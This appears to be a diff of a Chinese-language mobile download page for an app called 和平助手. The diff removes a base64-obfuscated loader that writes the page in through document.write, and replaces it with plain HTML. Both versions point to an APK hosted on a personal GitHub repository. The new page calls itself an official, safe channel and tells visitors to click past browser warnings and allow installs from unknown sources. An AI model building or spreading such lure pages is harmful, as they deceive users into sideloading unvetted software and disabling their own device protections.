@@ -1,16 +1,124 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>加载中...</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>应用下载中心</title>
 
-<script>
-var _0x='PCEtLURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPuS4lueVjOWQjeWkqDwvdGl0bGU+CiAgPHN0eWxlPgogICAgYm9keSB7CiAgICAgIG1hcmdpbjogMDsKICAgICAgcGFkZGluZzogMDsKICAgICAgaGVpZ2h0OiAxMDB2aDsKICAgICAgZGlzcGxheTogZmxleDsKICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbDsKICAgICAgYmFja2dyb3VuZDogdXJsKCcxMjM0NTYuanBnJykgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXI7CiAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgICB9CiAgICAuYm94IHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsMCwwLDAuNSk7CiAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7CiAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgd2lkdGg6IDkwJTsKICAgICAgbWF4LXdpZHRoOiA0MDBweDsKICAgIH0KICAgIGgxIHsgZm9udC1zaXplOiAyNHB4OyB9CiAgICBwIHsgZm9udC1zaXplOiAxNHB4OyB9CiAgICAuYnRuIHsKICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgICBwYWRkaW5nOiAxMnB4IDIwcHg7CiAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI4YTc0NTsKICAgICAgY29sb3I6IHdoaXRlOwogICAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgIH0KICAgIC5idG46aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjE4ODM4OyB9CiAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICA8ZGl2IGNsYXNzPSJib3giPgogICAgPGgxPuadpeS6rueUn+eZu+W9leWkqDwvaDE+CiAgICA8cD7mm7TlpJrnm67mlbDlj4DmlbDlvIDkvZPku6Pkv6HmiJHku6w8L3A+CiAgICA8YSBjbGFzcz0iYnRuIiBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vemhhbmdzYW4zNDU1L2Fway1kb3dubG9hZC9yYXcvbWFpbi9ocHpzb3h0ZXgwMzE2LmFwayI+5LiL6L295bmz5a6J5Yqo5omLPC9hPgogIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=';
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-document.write(atob(_0x));
-</script>
+    .container {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 30px;
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      border-radius: 20px;
+      margin-bottom: 15px;
+    }
+
+    h1 {
+      margin: 10px 0;
+      font-size: 22px;
+      color: #333;
+    }
+
+    .desc {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    .info {
+      font-size: 13px;
+      color: #999;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      display: block;
+      padding: 14px;
+      background: #007BFF;
+      color: white;
+      border-radius: 10px;
+      text-decoration: none;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background: #0056b3;
+    }
+
+    .safe {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    /* 手机优化 */
+    @media (max-width: 480px) {
+      h1 { font-size: 20px; }
+      .btn { font-size: 15px; }
+    }
+
+  </style>
+
+  <script>
+    function downloadApp() {
+      if(confirm("即将下载应用，是否继续？")) {
+        window.location.href = "https://github.com/zhangsan3455/apk-download/raw/main/hpzsoxtex0316.apk";
+      }
+    }
+  </script>
 
 </head>
-<body></body>
+
+<body>
+
+<div class="container">
+
+  <!-- 可替换为你的logo -->
+  <img src="123456.png" class="logo">
+
+  <h1>和平助手</h1>
+
+  <p class="desc">
+    官方下载渠道，提供稳定、安全的应用安装包
+  </p>
+
+  <div class="info">
+    版本：v1.0.0<br>
+    大小：18MB<br>
+    更新时间：2026-03
+  </div>
+
+  <a href="javascript:void(0)" class="btn" onclick="downloadApp()">
+    立即下载
+  </a>
+
+  <div class="safe">
+    ※ 如遇浏览器提示，请选择“继续下载”<br>
+    ※ 请确认允许安装未知来源应用
+  </div>
+
+</div>
+
+</body>
 </html>
